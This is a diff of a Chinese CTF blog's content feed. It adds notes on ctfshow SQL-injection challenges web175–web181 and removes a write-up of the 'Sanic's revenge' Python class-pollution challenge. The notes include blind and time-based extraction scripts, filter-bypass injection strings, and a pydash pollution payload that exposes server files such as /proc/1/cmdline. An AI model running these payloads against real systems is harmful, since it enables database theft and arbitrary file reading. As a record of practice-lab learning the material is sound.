@@ -80,13 +80,69 @@
 <p>有过滤的字符型注入，更改正则表达式 <code>/flag|[0-9]/i</code>，返回结果中不能有数字</p>
 <p>考虑盲注</p>
 <p>抓包接口是api&#x2F;v4.php</p>
-<p>编写payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23</span><br></pre></td></tr></table></figure>
 
+<p>这里稍稍解释下吧</p>
 <p>编写盲注脚本</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取常量</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://d0a608fb-8c33-4e69-abbc-5429035225b4.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">ASCII_START = <span class="number">32</span></span><br><span class="line">ASCII_END = <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    response = requests.get(URL + PAYLOAD_TEMPLATE.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lbw&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;xyz&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unexpected response content&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        start, end = ASCII_START, ASCII_END</span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            point = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">                start = point + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = point</span><br><span class="line">        flag += <span class="built_in">chr</span>(end)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 假设我们知道flag的结束字符，这里可以设置退出条件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">50</span>:  <span class="comment"># 这个条件可以根据实际情况调整</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = find_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;fe9a4453-ad08-4e6f-a83c-bcc2aa982a77&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>ctfshow{fe9a4453-ad08-4e6f-a83c-bcc2aa982a77}</p>
+<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+
+<p>也就是说什么都不会返回</p>
+<p>考虑时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(2) %23</span><br></pre></td></tr></table></figure>
+
+<p>可行</p>
+<p>上一关步骤一样</p>
+<p>编写脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量</span></span><br><span class="line">CHAR_SET = <span class="string">&#x27;1234567890-_&#123;&#125;qwertyuiopasdfghjklzxcvbnm&#x27;</span>  <span class="comment"># 字符集</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://80f58198-ee06-4a46-a2cc-3f2aea94e556.challenge.ctf.show/api/v5.php?id=&#123;&#125;&amp;page=1&amp;limit=1&#x27;</span></span><br><span class="line">DELAY_THRESHOLD = <span class="number">2</span>  <span class="comment"># 延迟时间（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_correct_char</span>(<span class="params">position: <span class="built_in">int</span>, char: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断指定字符是否在特定位置&quot;&quot;&quot;</span></span><br><span class="line">    sql_payload = <span class="string">&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(&#123;&#125;),0) %23&quot;</span>.<span class="built_in">format</span>(position, char, DELAY_THRESHOLD)</span><br><span class="line">    url = BASE_URL.<span class="built_in">format</span>(sql_payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    requests.get(url)</span><br><span class="line">    elapsed_time = time.time() - start_time</span><br><span class="line">    <span class="keyword">return</span> elapsed_time &gt;= DELAY_THRESHOLD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">max_length: <span class="built_in">int</span> = <span class="number">64</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;逐字符地提取 flag&quot;&quot;&quot;</span></span><br><span class="line">    extracted_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> CHAR_SET:</span><br><span class="line">            <span class="keyword">if</span> is_correct_char(pos, char):</span><br><span class="line">                extracted_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Extracted flag so far: <span class="subst">&#123;extracted_flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> extracted_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = extract_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final extracted flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;7b9f5582-39db-4e99-bed6-9da1772ed2ba&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>ctfshow{7b9f5582-39db-4e99-bed6-9da1772ed2ba}</p>
+<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>过滤了union select </p>
+<p>大小写绕过</p>
+<p>万能密码可以直接绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; Union Select 1,password,3 from ctfshow_user --+</span><br></pre></td></tr></table></figure>
+
+<p>ctfshow{939338e1-d47c-461b-bc76-f4e60435ae80}</p>
+<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>
+
+<p>过滤空格 而且 –+，#应该也过滤了</p>
+<p>&#x2F;**&#x2F; %23</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,group_concat(password),3/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure>
+
+<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>依旧可行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>
+
+<p>增加了<code>/**/</code>的过滤</p>
+<p>可以这些绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回车(%0a) `(tab键上面的按钮)(%09) tab 和  %0b %0c %0d %a0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%0aunion%0aselect%0a1,password,3%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,password,3%09from%09ctfshow_user%23</span><br></pre></td></tr></table></figure>
+
+<p>ctfshow{a2e33152-7f53-4000-b89b-972b5fc739a2}</p>
+<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0c可以用</span><br><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure>
+
+<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>还是过滤空格 只不过这次加了对 <code>#</code>(<code>%23</code>) 的过滤</p>
+<p>万能密码依旧能打</p>
+<p>只不过需要</p>
+<p>这里使用 <code>--</code>(–后加个空格) 绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user--%0c</span><br></pre></td></tr></table></figure>
+
+<p>ctfshow{94f1ba08-b230-4dda-9a6a-eeaac94caef2}</p>
+<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>继续造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure>
+
+<p>返回逻辑</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>sql刷题笔记</category>
@@ -540,261 +596,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Sanic&#39;s revenge(复现)</title>
-    <url>/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>复现这个之前先要学习下python的原型链污染（未学┭┮﹏┭┮）</p>
-<p>之前学了Nodejs原型链污染，Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。</p>
-<p>先看给的源码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> pydash  </span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)  </span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):  </span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span>  </span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):  </span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):  </span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]  </span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:  </span><br><span class="line">        pollute = Pollute()  </span><br><span class="line">        pydash.set_(pollute, key, value)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)  </span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span>  </span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span>  </span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span>  </span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);  </span><br><span class="line">        <span class="comment"># 生成日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="comment"># 备份日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>我们看到Pollute 路由这段</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>这是一个处理 <code>/pollute</code> 路径的异步函数 <code>POLLUTE</code>，支持 <code>GET</code> 和 <code>POST</code> 方法。</li>
-<li>解析请求的 JSON 数据，获取 <code>key</code> 和 <code>value</code>。</li>
-<li>如果条件满足：<ul>
-<li>创建一个 <code>Pollute</code> 实例。</li>
-<li>使用 <code>pydash.set_</code> 函数 设置 <code>pollute</code> 实例的属性。</li>
-<li>返回 “success” 文本。</li>
-</ul>
-</li>
-<li>这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入&#x2F;tmp目录下的文件中</li>
-</ul>
-<p>payload:</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段json代码就是将file_or_directory设置为”&#x2F;“我的基础还是很薄弱所以我们分析这个payload</p>
-<ol>
-<li><p><strong><code>__class__</code></strong>: 访问当前对象的类。</p>
-</li>
-<li><p><strong><code>__init__</code></strong>: 访问类的构造函数。</p>
-</li>
-<li><p><strong><code>__globals__</code></strong>: 访问构造函数的全局命名空间，这允许攻击者访问应用的全局变量。</p>
-</li>
-<li><p><strong><code>app.router.name_index.__mp_main__</code></strong>: 试图访问Sanic应用的路由器中的<code>name_index</code>，其中<code>__mp_main__</code>表示模块的名称。</p>
-</li>
-<li><p><strong><code>.static.handler.keywords.file_or_directory</code></strong>: 最终目标是访问并修改静态文件处理器的<code>file_or_directory</code>属性。</p>
-</li>
-<li><p><code>&quot;/&quot;</code>: 设置的值为根目录。（补充  ：</p>
-<p><code>file_or_directory</code> 这个属性的作用通常是用于指示文件处理器处理的是文件还是目录。攻击者试图通过修改 <code>file_or_directory</code> 属性，将其值设置为 <code>&quot;/&quot;</code>，可能导致服务器将根目录作为静态文件目录，从而暴露服务器上的敏感文件和目录。这种攻击利用了对关键属性缺乏适当验证和保护的漏洞。<br>）就可以实现任意文件读取</p>
-</li>
-</ol>
-<p><img src="/imgs/8.png"></p>
-<p>回显success，表面成功了</p>
-<p>接着我们访问&#x2F;static&#x2F;proc&#x2F;1&#x2F;cmdline</p>
-<p>inux系统中的<code>/proc</code>文件系统的路径，并通过应用的静态文件服务暴露出来</p>
-<ul>
-<li>**<code>/proc/1/cmdline</code>**：这是一个文件，包含启动进程ID为1的进程时使用的命令行参数。</li>
-</ul>
-<p><img src="/imgs/9.png"></p>
-<p>显示当前的启动路径为&#x2F;bin&#x2F;bash&#x2F;start.sh</p>
-<p>我们继续打开这个路径</p>
-<p><img src="/imgs/10.png"></p>
-<p>发现运行的py脚本</p>
-<p><img src="/imgs/11.png"></p>
-<p>给了丢失的源码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_log_dir</span>(<span class="params">n</span>):</span><br><span class="line">        ret = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            num = random.randint(<span class="number">0</span>, <span class="number">9</span>)</span><br><span class="line">            letter = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>, <span class="number">122</span>))</span><br><span class="line">            Letter = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>, <span class="number">90</span>))</span><br><span class="line">            s = <span class="built_in">str</span>(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/h111int&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    <span class="keyword">return</span> text(hint)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/adminLook&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">AdminLook</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment">#方便管理员查看非法日志</span></span><br><span class="line">    log_dir=os.popen(<span class="string">&#x27;ls /tmp -al&#x27;</span>).read();</span><br><span class="line">    <span class="keyword">return</span> text(log_dir)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment">#生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
